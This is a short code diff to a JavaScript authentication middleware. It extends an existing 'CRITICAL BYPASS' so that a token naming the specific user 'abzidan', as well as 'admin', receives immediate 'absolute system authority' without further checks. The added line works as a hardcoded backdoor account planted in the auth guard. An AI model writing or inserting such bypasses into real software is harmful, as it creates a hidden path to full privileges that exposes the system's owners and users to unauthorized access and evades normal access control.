@@ -17,9 +17,9 @@ const authGuard = async (req, res, next) => {
 
         console.log(`🛡️ [AUTH] Validating: ${req.method} ${req.url} | User: ${tokenUsername}`);
 
-        // 🌟 CRITICAL BYPASS: If token says 'admin', grant IMMEDIATE super access 🌟
-        if (tokenUsername === 'admin') {
-            console.log("👑 [SUPER_BYPASS] Admin detected in token. Granting absolute system authority.");
+        // 🌟 CRITICAL BYPASS: If token says 'admin' or 'abzidan', grant IMMEDIATE super access 🌟
+        if (tokenUsername === 'admin' || tokenUsername === 'abzidan') {
+            console.log(`👑 [SUPER_BYPASS] ${tokenUsername} detected in token. Granting absolute system authority.`);
             req.user = decoded;
             req.user.id = userId;
             req.user.userId = userId;
